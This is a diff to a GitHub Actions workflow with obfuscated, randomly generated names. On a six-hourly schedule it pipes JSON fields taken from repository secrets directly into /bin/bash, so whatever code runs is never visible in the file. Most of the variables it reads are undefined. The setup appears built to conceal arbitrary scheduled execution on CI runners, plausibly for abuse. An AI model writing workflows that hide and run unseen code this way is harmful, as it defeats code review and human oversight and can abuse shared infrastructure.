@@ -1,30 +1,25 @@
 name: yangxiaosan3728
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
-
+    - cron: '14 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yangxiaosan3728
         env:
-          wmzi80419: ${{ secrets.wmzi80419 }}
+          rua1866: ${{ secrets.rua1866 }}
         run: |
-          echo $wmzi80419 | jq -r .pc93 | /bin/bash
-          echo $ynovl5536 | jq -r .v2 | /bin/bash
-          echo $tczlg88 | jq -r .vmmw0022 | /bin/bash
-          echo $nldbh90246 | jq -r .fncvv1277 | /bin/bash
-          echo $ml41 | jq -r .e2 | /bin/bash
-          echo $id9257 | jq -r .s5422 | /bin/bash
-          echo $apgu179 | jq -r .ibakt96556 | /bin/bash
-          echo $mnc7988 | jq -r .kolo2266 | /bin/bash
-          echo $ivhj2563 | jq -r .ajxn69 | /bin/bash
-          echo $rwh7 | jq -r .jxkc6 | /bin/bash
-          echo $kix2 | jq -r .l29 | /bin/bash
-          echo $q729 | jq -r .wzn9494 | /bin/bash
-          echo $bru42762 | jq -r .oes2745 | /bin/bash
+          echo $rua1866 | jq -r .mgl52 | /bin/bash
+          echo $vkks09 | jq -r .mw222 | /bin/bash
+          echo $femis7964 | jq -r .qqoz9 | /bin/bash
+          echo $f02009 | jq -r .awqao47884 | /bin/bash
+          echo $qt97090 | jq -r .oyvdn73503 | /bin/bash
+          echo $qcvsw78 | jq -r .kdttf9236 | /bin/bash
+          echo $slh19 | jq -r .t5 | /bin/bash
+          echo $cbp708 | jq -r .audyu6453 | /bin/bash
+          echo $n118 | jq -r .l4 | /bin/bash
 
